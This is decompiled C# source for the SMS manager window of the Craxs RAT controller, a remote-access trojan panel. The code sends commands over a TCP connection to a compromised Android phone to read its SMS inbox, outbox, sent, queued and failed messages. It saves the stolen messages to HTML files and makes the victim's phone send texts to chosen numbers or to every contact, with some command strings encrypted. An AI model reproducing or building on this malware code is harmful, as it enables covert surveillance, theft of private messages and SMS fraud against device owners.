using System;
using System.ComponentModel;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Craxs_Rat.My;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Vip.Notification;

namespace Craxs_Rat
{
	// Token: 0x020000FC RID: 252
	[DesignerGenerated]
	public partial class SMSManager : Form
	{
		// Token: 0x06001263 RID: 4707 RVA: 0x000BF51C File Offset: 0x000BD71C
		public SMSManager()
		{
			base.Load += this.SMSManager_Load;
			base.Closing += this.SMSManager_Closing;
			base.Activated += this.SMSManager_Activated;
			base.Deactivate += this.SMSManager_Deactivate;
			this.string_0 = "null";
			this.bool_0 = false;
			this.InitializeComponent();
		}

		// Token: 0x17000567 RID: 1383
		// (get) Token: 0x06001266 RID: 4710 RVA: 0x0000746C File Offset: 0x0000566C
		// (set) Token: 0x06001267 RID: 4711 RVA: 0x000C00D8 File Offset: 0x000BE2D8
		internal virtual DataGridView DGV0
		{
			[CompilerGenerated]
			get
			{
				return this._DGV0;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV0_CellContentClick);
				DataGridViewCellEventHandler value3 = new DataGridViewCellEventHandler(this.DGV0_CellClick);
				DataGridViewCellEventHandler value4 = new DataGridViewCellEventHandler(this.DGV0_RowEnter);
				DataGridViewRowsRemovedEventHandler value5 = new DataGridViewRowsRemovedEventHandler(this.DGV0_RowsRemoved);
				DataGridViewRowsAddedEventHandler value6 = new DataGridViewRowsAddedEventHandler(this.DGV0_RowsAdded);
				EventHandler value7 = new EventHandler(this.DGV0_SelectionChanged);
				DataGridView dgv = this._DGV0;
				if (dgv != null)
				{
					dgv.CellContentClick -= value2;
					dgv.CellClick -= value3;
					dgv.RowEnter -= value4;
					dgv.RowsRemoved -= value5;
					dgv.RowsAdded -= value6;
					dgv.SelectionChanged -= value7;
				}
				this._DGV0 = value;
				dgv = this._DGV0;
				if (dgv != null)
				{
					dgv.CellContentClick += value2;
					dgv.CellClick += value3;
					dgv.RowEnter += value4;
					dgv.RowsRemoved += value5;
					dgv.RowsAdded += value6;
					dgv.SelectionChanged += value7;
				}
			}
		}

		// Token: 0x17000568 RID: 1384
		// (get) Token: 0x06001268 RID: 4712 RVA: 0x00007474 File Offset: 0x00005674
		// (set) Token: 0x06001269 RID: 4713 RVA: 0x000C01B8 File Offset: 0x000BE3B8
		internal virtual ContextMenuStrip ContextMenuStrip1 { get; set; }

		// Token: 0x17000569 RID: 1385
		// (get) Token: 0x0600126A RID: 4714 RVA: 0x0000747C File Offset: 0x0000567C
		// (set) Token: 0x0600126B RID: 4715 RVA: 0x000C01CC File Offset: 0x000BE3CC
		internal virtual ToolStripMenuItem PathsToolStripMenuItem { get; set; }

		// Token: 0x1700056A RID: 1386
		// (get) Token: 0x0600126C RID: 4716 RVA: 0x00007484 File Offset: 0x00005684
		// (set) Token: 0x0600126D RID: 4717 RVA: 0x000C01E0 File Offset: 0x000BE3E0
		internal virtual ToolStripMenuItem AllToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._AllToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.AllToolStripMenuItem_Click);
				ToolStripMenuItem allToolStripMenuItem = this._AllToolStripMenuItem;
				if (allToolStripMenuItem != null)
				{
					allToolStripMenuItem.Click -= value2;
				}
				this._AllToolStripMenuItem = value;
				allToolStripMenuItem = this._AllToolStripMenuItem;
				if (allToolStripMenuItem != null)
				{
					allToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700056B RID: 1387
		// (get) Token: 0x0600126E RID: 4718 RVA: 0x0000748C File Offset: 0x0000568C
		// (set) Token: 0x0600126F RID: 4719 RVA: 0x000C0224 File Offset: 0x000BE424
		internal virtual ToolStripMenuItem OutboxToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._OutboxToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.OutboxToolStripMenuItem_Click);
				ToolStripMenuItem outboxToolStripMenuItem = this._OutboxToolStripMenuItem;
				if (outboxToolStripMenuItem != null)
				{
					outboxToolStripMenuItem.Click -= value2;
				}
				this._OutboxToolStripMenuItem = value;
				outboxToolStripMenuItem = this._OutboxToolStripMenuItem;
				if (outboxToolStripMenuItem != null)
				{
					outboxToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700056C RID: 1388
		// (get) Token: 0x06001270 RID: 4720 RVA: 0x00007494 File Offset: 0x00005694
		// (set) Token: 0x06001271 RID: 4721 RVA: 0x000C0268 File Offset: 0x000BE468
		internal virtual ToolStripMenuItem InboxToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._InboxToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.InboxToolStripMenuItem_Click);
				ToolStripMenuItem inboxToolStripMenuItem = this._InboxToolStripMenuItem;
				if (inboxToolStripMenuItem != null)
				{
					inboxToolStripMenuItem.Click -= value2;
				}
				this._InboxToolStripMenuItem = value;
				inboxToolStripMenuItem = this._InboxToolStripMenuItem;
				if (inboxToolStripMenuItem != null)
				{
					inboxToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700056D RID: 1389
		// (get) Token: 0x06001272 RID: 4722 RVA: 0x0000749C File Offset: 0x0000569C
		// (set) Token: 0x06001273 RID: 4723 RVA: 0x000C02AC File Offset: 0x000BE4AC
		internal virtual ToolStripMenuItem SentToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SentToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SentToolStripMenuItem_Click);
				ToolStripMenuItem sentToolStripMenuItem = this._SentToolStripMenuItem;
				if (sentToolStripMenuItem != null)
				{
					sentToolStripMenuItem.Click -= value2;
				}
				this._SentToolStripMenuItem = value;
				sentToolStripMenuItem = this._SentToolStripMenuItem;
				if (sentToolStripMenuItem != null)
				{
					sentToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700056E RID: 1390
		// (get) Token: 0x06001274 RID: 4724 RVA: 0x000074A4 File Offset: 0x000056A4
		// (set) Token: 0x06001275 RID: 4725 RVA: 0x000C02F0 File Offset: 0x000BE4F0
		internal virtual ToolStripMenuItem QueuedToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._QueuedToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.QueuedToolStripMenuItem_Click);
				ToolStripMenuItem queuedToolStripMenuItem = this._QueuedToolStripMenuItem;
				if (queuedToolStripMenuItem != null)
				{
					queuedToolStripMenuItem.Click -= value2;
				}
				this._QueuedToolStripMenuItem = value;
				queuedToolStripMenuItem = this._QueuedToolStripMenuItem;
				if (queuedToolStripMenuItem != null)
				{
					queuedToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700056F RID: 1391
		// (get) Token: 0x06001276 RID: 4726 RVA: 0x000074AC File Offset: 0x000056AC
		// (set) Token: 0x06001277 RID: 4727 RVA: 0x000C0334 File Offset: 0x000BE534
		internal virtual ToolStripMenuItem FailedToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._FailedToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.FailedToolStripMenuItem_Click);
				ToolStripMenuItem failedToolStripMenuItem = this._FailedToolStripMenuItem;
				if (failedToolStripMenuItem != null)
				{
					failedToolStripMenuItem.Click -= value2;
				}
				this._FailedToolStripMenuItem = value;
				failedToolStripMenuItem = this._FailedToolStripMenuItem;
				if (failedToolStripMenuItem != null)
				{
					failedToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000570 RID: 1392
		// (get) Token: 0x06001278 RID: 4728 RVA: 0x000074B4 File Offset: 0x000056B4
		// (set) Token: 0x06001279 RID: 4729 RVA: 0x000C0378 File Offset: 0x000BE578
		internal virtual ToolStripMenuItem SaveToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SaveToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveToolStripMenuItem_Click);
				ToolStripMenuItem saveToolStripMenuItem = this._SaveToolStripMenuItem;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click -= value2;
				}
				this._SaveToolStripMenuItem = value;
				saveToolStripMenuItem = this._SaveToolStripMenuItem;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000571 RID: 1393
		// (get) Token: 0x0600127A RID: 4730 RVA: 0x000074BC File Offset: 0x000056BC
		// (set) Token: 0x0600127B RID: 4731 RVA: 0x000C03BC File Offset: 0x000BE5BC
		internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SaveAsToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveAsToolStripMenuItem_Click);
				ToolStripMenuItem saveAsToolStripMenuItem = this._SaveAsToolStripMenuItem;
				if (saveAsToolStripMenuItem != null)
				{
					saveAsToolStripMenuItem.Click -= value2;
				}
				this._SaveAsToolStripMenuItem = value;
				saveAsToolStripMenuItem = this._SaveAsToolStripMenuItem;
				if (saveAsToolStripMenuItem != null)
				{
					saveAsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700057B RID: 1403
		// (get) Token: 0x0600127C RID: 4732 RVA: 0x000074C4 File Offset: 0x000056C4
		// (set) Token: 0x0600127D RID: 4733 RVA: 0x000C0400 File Offset: 0x000BE600
		internal virtual System.Windows.Forms.Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				System.Windows.Forms.Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x17000572 RID: 1394
		// (get) Token: 0x0600127E RID: 4734 RVA: 0x000074CC File Offset: 0x000056CC
		// (set) Token: 0x0600127F RID: 4735 RVA: 0x000C0444 File Offset: 0x000BE644
		internal virtual ProgressBar PB { get; set; }

		// Token: 0x17000573 RID: 1395
		// (get) Token: 0x06001280 RID: 4736 RVA: 0x000074D4 File Offset: 0x000056D4
		// (set) Token: 0x06001281 RID: 4737 RVA: 0x000C0458 File Offset: 0x000BE658
		internal virtual PictureBox BoxTitle
		{
			[CompilerGenerated]
			get
			{
				return this._BoxTitle;
			}
			[CompilerGenerated]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.BoxTitle_Paint);
				EventHandler value3 = new EventHandler(this.BoxTitle_Resize);
				PictureBox boxTitle = this._BoxTitle;
				if (boxTitle != null)
				{
					boxTitle.Paint -= value2;
					boxTitle.Resize -= value3;
				}
				this._BoxTitle = value;
				boxTitle = this._BoxTitle;
				if (boxTitle != null)
				{
					boxTitle.Paint += value2;
					boxTitle.Resize += value3;
				}
			}
		}

		// Token: 0x17000574 RID: 1396
		// (get) Token: 0x06001282 RID: 4738 RVA: 0x000074DC File Offset: 0x000056DC
		// (set) Token: 0x06001283 RID: 4739 RVA: 0x000C04B8 File Offset: 0x000BE6B8
		internal virtual DataGridViewTextBoxColumn Column1 { get; set; }

		// Token: 0x17000575 RID: 1397
		// (get) Token: 0x06001284 RID: 4740 RVA: 0x000074E4 File Offset: 0x000056E4
		// (set) Token: 0x06001285 RID: 4741 RVA: 0x000C04CC File Offset: 0x000BE6CC
		internal virtual DataGridViewTextBoxColumn Column6 { get; set; }

		// Token: 0x17000576 RID: 1398
		// (get) Token: 0x06001286 RID: 4742 RVA: 0x000074EC File Offset: 0x000056EC
		// (set) Token: 0x06001287 RID: 4743 RVA: 0x000C04E0 File Offset: 0x000BE6E0
		internal virtual DataGridViewTextBoxColumn Column9 { get; set; }

		// Token: 0x17000577 RID: 1399
		// (get) Token: 0x06001288 RID: 4744 RVA: 0x000074F4 File Offset: 0x000056F4
		// (set) Token: 0x06001289 RID: 4745 RVA: 0x000C04F4 File Offset: 0x000BE6F4
		internal virtual DataGridViewTextBoxColumn Column7 { get; set; }

		// Token: 0x17000578 RID: 1400
		// (get) Token: 0x0600128A RID: 4746 RVA: 0x000074FC File Offset: 0x000056FC
		// (set) Token: 0x0600128B RID: 4747 RVA: 0x000C0508 File Offset: 0x000BE708
		internal virtual DataGridViewTextBoxColumn Column2 { get; set; }

		// Token: 0x17000579 RID: 1401
		// (get) Token: 0x0600128C RID: 4748 RVA: 0x00007504 File Offset: 0x00005704
		// (set) Token: 0x0600128D RID: 4749 RVA: 0x000C051C File Offset: 0x000BE71C
		internal virtual DataGridViewImageColumn Column3 { get; set; }

		// Token: 0x1700057A RID: 1402
		// (get) Token: 0x0600128E RID: 4750 RVA: 0x0000750C File Offset: 0x0000570C
		// (set) Token: 0x0600128F RID: 4751 RVA: 0x000C0530 File Offset: 0x000BE730
		internal virtual DrakeUIAvatar DrakeUIAvatar1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIAvatar1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIAvatar1_Click);
				DrakeUIAvatar drakeUIAvatar = this._DrakeUIAvatar1;
				if (drakeUIAvatar != null)
				{
					drakeUIAvatar.Click -= value2;
				}
				this._DrakeUIAvatar1 = value;
				drakeUIAvatar = this._DrakeUIAvatar1;
				if (drakeUIAvatar != null)
				{
					drakeUIAvatar.Click += value2;
				}
			}
		}

		// Token: 0x1700057C RID: 1404
		// (get) Token: 0x06001290 RID: 4752 RVA: 0x00007514 File Offset: 0x00005714
		// (set) Token: 0x06001291 RID: 4753 RVA: 0x000C0574 File Offset: 0x000BE774
		internal virtual DrakeUIToolTip DrakeUIToolTip1 { get; set; }

		// Token: 0x06001292 RID: 4754 RVA: 0x000C0588 File Offset: 0x000BE788
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity == 1.0)
			{
				this.TOpacity.Enabled = false;
			}
			else
			{
				base.Opacity += 0.1;
			}
		}

		// Token: 0x06001293 RID: 4755 RVA: 0x000C05D0 File Offset: 0x000BE7D0
		private void SMSManager_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\14.ico");
			this.ContextMenuStrip1.Renderer = new GClass12();
			((ToolStripDropDownMenu)this.PathsToolStripMenuItem.DropDown).ShowImageMargin = false;
			((ToolStripDropDownMenu)this.PathsToolStripMenuItem.DropDown).BackColor = this.ContextMenuStrip1.BackColor;
			this.DGV0.ColumnHeadersDefaultCellStyle.Font = Module8.font_1;
			this.DGV0.DefaultCellStyle.Font = Module8.font_1;
			if (Operators.CompareString(Module5.Saving_data, "No", false) == 0)
			{
				this.SaveToolStripMenuItem.Visible = true;
				this.SaveAsToolStripMenuItem.Visible = true;
			}
			this.Text = this.string_0;
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
			this.bool_0 = true;
		}

		// Token: 0x06001294 RID: 4756 RVA: 0x0000246D File Offset: 0x0000066D
		private void DGV0_CellContentClick(object sender, DataGridViewCellEventArgs e)
		{
		}

		// Token: 0x06001295 RID: 4757 RVA: 0x000C06C0 File Offset: 0x000BE8C0
		private void DGV0_CellClick(object sender, DataGridViewCellEventArgs e)
		{
			if (e.RowIndex != -1 & e.ColumnIndex != -1)
			{
				this.method_4(e.RowIndex);
			}
		}

		// Token: 0x06001296 RID: 4758 RVA: 0x000C06C0 File Offset: 0x000BE8C0
		private void DGV0_RowEnter(object sender, DataGridViewCellEventArgs e)
		{
			if (e.RowIndex != -1 & e.ColumnIndex != -1)
			{
				this.method_4(e.RowIndex);
			}
		}

		// Token: 0x06001297 RID: 4759 RVA: 0x000C06F4 File Offset: 0x000BE8F4
		private void method_4(int int_0)
		{
			if (int_0 != -1)
			{
				string name = "Text_Message_" + this.gclass8_0.string_2;
				this.textMessage_0 = (TextMessage)MyProject.Application.OpenForms[name];
				if (this.textMessage_0 == null)
				{
					this.textMessage_0 = new TextMessage();
					this.textMessage_0.Name = name;
					this.textMessage_0.string_0 = string.Format("{0} - IP:{1}", "Text Message", this.gclass8_0.string_1);
					this.textMessage_0.object_0 = this.tcpClient_0;
					this.textMessage_0.object_1 = this.gclass8_0;
					this.textMessage_0.WindowState = FormWindowState.Minimized;
					base.TopMost = true;
					this.textMessage_0.Show();
					this.textMessage_0.WindowState = FormWindowState.Normal;
					base.TopMost = false;
				}
				this.textMessage_0.TextMsg.Text = Conversions.ToString(this.DGV0.Rows[int_0].Tag);
				this.textMessage_0.TextMsg.Font = Module8.font_1;
			}
		}

		// Token: 0x06001298 RID: 4760 RVA: 0x000C081C File Offset: 0x000BEA1C
		private void SMSManager_Closing(object sender, CancelEventArgs e)
		{
			if (this.textMessage_0 != null)
			{
				this.textMessage_0.Close();
			}
		}

		// Token: 0x06001299 RID: 4761 RVA: 0x000C0840 File Offset: 0x000BEA40
		private void method_6(string string_0)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.tcpClient_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".sms",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_2,
						GClass9.string_0,
						"sms",
						GClass9.string_1,
						string_0
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x0600129A RID: 4762 RVA: 0x000C0900 File Offset: 0x000BEB00
		private void AllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.method_6("content://sms/");
		}

		// Token: 0x0600129B RID: 4763 RVA: 0x000C0918 File Offset: 0x000BEB18
		private void OutboxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.method_6("content://sms/outbox");
		}

		// Token: 0x0600129C RID: 4764 RVA: 0x000C0930 File Offset: 0x000BEB30
		private void InboxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.method_6("content://sms/inbox");
		}

		// Token: 0x0600129D RID: 4765 RVA: 0x000C0948 File Offset: 0x000BEB48
		private void SentToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.method_6("content://sms/sent");
		}

		// Token: 0x0600129E RID: 4766 RVA: 0x000C0960 File Offset: 0x000BEB60
		private void QueuedToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.method_6("content://sms/queued");
		}

		// Token: 0x0600129F RID: 4767 RVA: 0x000C0978 File Offset: 0x000BEB78
		private void FailedToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.method_6("content://sms/failed");
		}

		// Token: 0x060012A0 RID: 4768 RVA: 0x000C0990 File Offset: 0x000BEB90
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
			saveFileDialog.Filter = "html (*.html)|*.html";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				ThreadPool.QueueUserWorkItem((SMSManager.Class27.waitCallback_0 == null) ? (SMSManager.Class27.waitCallback_0 = new WaitCallback(SMSManager.Class27.class27_0.method_0)) : SMSManager.Class27.waitCallback_0, new object[]
				{
					this.DGV0,
					"null",
					saveFileDialog.FileName,
					this.object_1,
					this.string_1 + " - " + this.string_2,
					"SMS",
					"sms",
					"null"
				});
			}
			saveFileDialog.Dispose();
		}

		// Token: 0x060012A1 RID: 4769 RVA: 0x000C0A68 File Offset: 0x000BEC68
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Module8.smethod_5(this.gclass8_0);
			ThreadPool.QueueUserWorkItem((SMSManager.Class27.waitCallback_1 == null) ? (SMSManager.Class27.waitCallback_1 = new WaitCallback(SMSManager.Class27.class27_0.method_1)) : SMSManager.Class27.waitCallback_1, new object[]
			{
				this.DGV0,
				this.object_0,
				"SMS Manager",
				this.object_1,
				this.string_1 + " - " + this.string_2,
				"SMS",
				"sms",
				DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
			});
		}

		// Token: 0x060012A2 RID: 4770 RVA: 0x000C0B1C File Offset: 0x000BED1C
		private void BoxTitle_Paint(object sender, PaintEventArgs e)
		{
			checked
			{
				if (this.bool_0)
				{
					int count = this.DGV0.Rows.Count;
					string str = "All " + Conversions.ToString(count);
					string str2 = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
					Color white = Module5.White;
					e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int)white.R, (int)white.G, (int)white.B)), 0, 1, this.BoxTitle.Width, 1);
					Brush brush = new SolidBrush(Module5.White);
					Brush brush2 = new SolidBrush(Color.FromArgb(170, (int)this.BoxTitle.BackColor.R, (int)this.BoxTitle.BackColor.G, (int)this.BoxTitle.BackColor.B));
					Size size = TextRenderer.MeasureText(str + Strings.Space(10) + str2, Module8.font_1);
					Rectangle rect = new Rectangle(0, 2, this.BoxTitle.Width, size.Height + 5);
					e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
					e.Graphics.DrawString(str + Strings.Space(10) + str2 + Strings.Space(10), Module8.font_1, brush, 0f, 2f);
					Size size2 = TextRenderer.MeasureText("S", Module8.font_1);
					if (this.BoxTitle.Height != size2.Height + 3)
					{
						this.BoxTitle.Height = size2.Height + 3;
					}
				}
			}
		}

		// Token: 0x060012A3 RID: 4771 RVA: 0x000C0CD0 File Offset: 0x000BEED0
		private void SMSManager_Activated(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060012A4 RID: 4772 RVA: 0x000C0CD0 File Offset: 0x000BEED0
		private void SMSManager_Deactivate(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060012A5 RID: 4773 RVA: 0x000C0CD0 File Offset: 0x000BEED0
		private void BoxTitle_Resize(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060012A6 RID: 4774 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_18(object sender, EventArgs e)
		{
		}

		// Token: 0x060012A7 RID: 4775 RVA: 0x000C0CE8 File Offset: 0x000BEEE8
		private void DrakeUIAvatar1_Click(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (this.gclass8_0 != null)
					{
						smsMaker smsMaker = new smsMaker();
						if (smsMaker.ShowDialog() == DialogResult.OK && smsMaker.numslist.Items.Count > 0)
						{
							string text = smsMaker.msgtext.Text;
							TcpClient tcpClient = this.gclass8_0.tcpClient_0;
							string[] array = this.gclass8_0.string_0.Split(new char[]
							{
								':'
							});
							int value = 0;
							int value2 = 0;
							if (!smsMaker.checkall.Checked)
							{
								int num = smsMaker.numslist.Items.Count - 1;
								for (int i = 0; i <= num; i++)
								{
									string text2 = Conversions.ToString(smsMaker.numslist.Items[i]);
									if (!(string.IsNullOrEmpty(text2) | string.IsNullOrWhiteSpace(text2)))
									{
										object[] objects_ = new object[]
										{
											tcpClient,
											Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Module13.string_29 + GClass9.string_0, Module2.smethod_11("YcBFkd4jGXwxD5rP4InGOQ==")), text2), "#"), text), GClass9.string_0), array[0]), GClass9.string_0), array[1]), GClass9.string_0), Module13.string_5), GClass9.string_0), Conversions.ToString(value)), GClass9.string_0), Conversions.ToString(value2)), GClass9.string_0), GClass9.string_3), GClass9.string_0), this.gclass8_0.string_2),
											Module2.smethod_9().GetBytes("null"),
											this.gclass8_0
										};
										this.gclass8_0.method_2(objects_);
									}
								}
							}
							else
							{
								object[] objects_2 = new object[]
								{
									tcpClient,
									Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Module13.string_29 + GClass9.string_0, Module2.smethod_11("YcBFkd4jGXwxD5rP4InGOQ==")), "all<>"), text), "#"), GClass9.string_0), array[0]), GClass9.string_0), array[1]), GClass9.string_0), Module13.string_5), GClass9.string_0), Conversions.ToString(value)), GClass9.string_0), Conversions.ToString(value2)), GClass9.string_0), GClass9.string_3), GClass9.string_0), this.gclass8_0.string_2),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_2);
							}
							Alert.ShowSucess(Conversions.ToString(Module2.smethod_11("hsDAfeL7UykrbxSCTgjL/boElYxMzfSxFoFfTPEhR1T7BQRSfIXjISezO8i54iaL")));
						}
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x060012A8 RID: 4776 RVA: 0x000C0CD0 File Offset: 0x000BEED0
		private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060012A9 RID: 4777 RVA: 0x000C0CD0 File Offset: 0x000BEED0
		private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060012AA RID: 4778 RVA: 0x000C0CD0 File Offset: 0x000BEED0
		private void DGV0_SelectionChanged(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x04000A55 RID: 2645
		public TcpClient tcpClient_0;

		// Token: 0x04000A56 RID: 2646
		public GClass8 gclass8_0;

		// Token: 0x04000A57 RID: 2647
		public TextMessage textMessage_0;

		// Token: 0x04000A58 RID: 2648
		public string string_0;

		// Token: 0x04000A59 RID: 2649
		public string object_0;

		// Token: 0x04000A5A RID: 2650
		public string object_1;

		// Token: 0x04000A5B RID: 2651
		public string string_1;

		// Token: 0x04000A5C RID: 2652
		public string string_2;

		// Token: 0x04000A5D RID: 2653
		private bool bool_0;

		// Token: 0x020000FD RID: 253
		[CompilerGenerated]
		[Serializable]
		internal sealed class Class27
		{
			// Token: 0x060012AD RID: 4781 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_0(object _object_0)
			{
				Module8.smethod_13((Array)_object_0);
			}

			// Token: 0x060012AE RID: 4782 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_1(object _object_1)
			{
				Module8.smethod_13((Array)_object_1);
			}

			// Token: 0x04000A5E RID: 2654
			public static readonly SMSManager.Class27 class27_0 = new SMSManager.Class27();

			// Token: 0x04000A5F RID: 2655
			public static WaitCallback waitCallback_0;

			// Token: 0x04000A60 RID: 2656
			public static WaitCallback waitCallback_1;
		}
	}
}
